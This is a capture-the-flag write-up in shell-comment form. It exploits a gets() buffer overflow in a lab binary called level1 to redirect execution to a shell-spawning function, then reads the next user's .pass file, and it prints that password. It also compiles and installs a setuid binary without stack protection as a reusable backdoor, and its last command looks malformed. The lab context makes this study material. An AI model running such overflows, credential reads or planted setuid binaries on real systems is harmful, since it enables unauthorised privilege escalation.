# ------------------------------------------------------------------------
# Obtain the next password
# ------------------------------------------------------------------------

# Examine the given binary
objdump -d -M intel ~/level1

# In main(), the program uses gets() to copy a string from stdin to a buffer.

# We can overflow this buffer and overwrite the return address, so at the end of main() the program will jump to run() at 0x08048444, where it writes a message and then spawns a shell.

# From trial and error, we find that supplying a string of length 77+ corrupts the return address.
python -c "print('A' * 76)" | ~/level1

# Using gdb, we deduce the stack state:

return address					(4 bytes)
space from esp alignment		(8 bytes)
old ebp							(4 bytes)
buffer							(64 bytes)

# We overflow the buffer overwrite the return address with 0x08048444, reversed for little-endian.
# We trick the program to stay open with cat listening on stdin.
(python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])"; cat) | ~/level1

# We redirected the program to call run() and spawn a shell, in which the user is level2
whoami

# Read the password for user level2
cat /home/user/level2/.pass

# Terminate the shell, and the program
exit
asdf

# Now we can log in as user level2
su level2
# password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77



# ------------------------------------------------------------------------
# Recreate the exploitable binary
# ------------------------------------------------------------------------

# As user level2, compile the exploit in /tmp
gcc source.c -fno-stack-protector

# Edit suid
chmod u+s a.out

# Move the exploit to level2 home directory
chmod +wx ~; mv a.out ~

# Now user level1 can run the exploit
(python -c "print('A' * 76) + '\x08\x04\x84\x64'[::-1]"; cat) | /home/user/level2/a.out


